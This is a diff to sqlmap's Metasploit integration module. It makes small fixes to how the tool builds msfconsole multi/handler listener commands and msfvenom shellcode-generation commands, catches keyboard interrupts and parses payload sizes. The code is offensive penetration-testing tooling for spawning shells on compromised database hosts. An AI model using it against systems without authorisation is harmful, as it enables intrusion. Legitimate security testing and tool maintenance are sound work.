@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
 See the file 'doc/COPYING' for copying permission
 """
 
@@ -351,7 +351,7 @@ class Metasploit:
 
             self._cliCmd += " E"
         else:
-            self._cliCmd = "%s -x 'use multi/handler; set PAYLOAD %s" % (self._msfConsole, self.payloadConnStr)
+            self._cliCmd = "%s -L -x 'use multi/handler; set PAYLOAD %s" % (self._msfConsole, self.payloadConnStr)
             self._cliCmd += "; set EXITFUNC %s" % exitfunc
             self._cliCmd += "; set LPORT %s" % self.portStr
 
@@ -429,10 +429,12 @@ class Metasploit:
                 self._payloadCmd += " X > \"%s\"" % outFile
         else:
             if extra == "BufferRegister=EAX":
-                self._payloadCmd += " -a x86 -e %s -f %s > \"%s\"" % (self.encoderStr, format, outFile)
+                self._payloadCmd += " -a x86 -e %s -f %s" % (self.encoderStr, format)
 
                 if extra is not None:
                     self._payloadCmd += " %s" % extra
+
+                self._payloadCmd += " > \"%s\"" % outFile
             else:
                 self._payloadCmd += " -f exe > \"%s\"" % outFile
 
@@ -599,6 +601,8 @@ class Metasploit:
 
             except (EOFError, IOError, select.error):
                 return proc.returncode
+            except KeyboardInterrupt:
+                pass
 
     def createMsfShellcode(self, exitfunc, format, extra, encode):
         infoMsg = "creating Metasploit Framework multi-stage shellcode "
@@ -618,7 +622,7 @@ class Metasploit:
         pollProcess(process)
         payloadStderr = process.communicate()[1]
 
-        match = re.search("(Total size:|Length:|succeeded with size) ([\d]+)", payloadStderr)
+        match = re.search("(Total size:|Length:|succeeded with size|Final size of exe file:) ([\d]+)", payloadStderr)
 
         if match:
             payloadSize = int(match.group(2))
